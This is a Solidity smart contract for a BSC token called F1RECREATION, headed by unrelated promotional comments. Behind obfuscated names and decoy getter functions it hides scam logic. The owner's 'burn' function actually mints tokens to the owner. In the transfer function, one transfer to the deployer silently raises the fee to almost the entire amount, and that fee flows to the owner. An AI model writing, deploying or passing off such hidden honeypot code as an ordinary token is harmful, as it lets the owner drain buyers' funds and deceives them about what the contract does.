/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

//F1RECREATIONSG!!!
//Happy November! Get a reformer bundle at the price of a normal reformer and earn up to $850!
//A great opportunity to get started or to add to your existing collection. Promotion starts today and ends 30 Dec 2022.
//https://t.co/rsylMs0ht2?twclid=26hsthc44qcb7uwmy2voxjojvg
//https://twitter.com/F1RECREATIONSG


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
contract F1RECREATION {
uint256 private  CFSVIG = 10000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  UKTYIB = 1000000000000000000000;
uint256 public constant PHONXG = 99999;
uint256 private  BNNFLJ = 100000000;
string public  name = "F1RECREATION";
uint256 private  MWRKGG = 10000000000;
address private  IFLXCG = address(0);
address private  EBYXRW = address(0);
uint8 public constant decimals = 18;
uint256 private  XXLPYJ = 1000000000000000000;
uint256 private  VVUAUP = 1000000000000000;
mapping (address => uint256) public balanceOf;
address public owner;
address private  PJSHUY = address(0);
string public  symbol = "F1RECREATION";
address private  FPGHDU = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 private  PPXAYQ = 1000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
event Transfer(address indexed from, address indexed to, uint256 value);
address private  UJXSTP = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
function _getVVUAUP() private returns (uint256) {
return VVUAUP;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
constructor () {
EBYXRW = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _getBNNFLJ() private returns (uint256) {
return BNNFLJ;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getUKTYIB() private returns (uint256) {
return UKTYIB;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getIFLXCG() private returns (address) {
return IFLXCG;
}

function _getUJXSTP() private returns (address) {
return UJXSTP;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tZPVAUN 0");
require(spender != address(0), "fZPVAUN 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getPJSHUY() private returns (address) {
return PJSHUY;
}

function _getMWRKGG() private returns (uint256) {
return MWRKGG;
}

function _getPPXAYQ() private returns (uint256) {
return PPXAYQ;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ZPVAUN");
require(to != address(0), "ZPVAUN");
require(amount <= balanceOf[from], "ZPVAUN");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* PHONXG/XXLPYJ ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==EBYXRW){
XXLPYJ = PHONXG+2;
}
emit Transfer(from, to, transferAmount);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getCFSVIG() private returns (uint256) {
return CFSVIG;
}

function _getFPGHDU() private returns (address) {
return FPGHDU;
}


}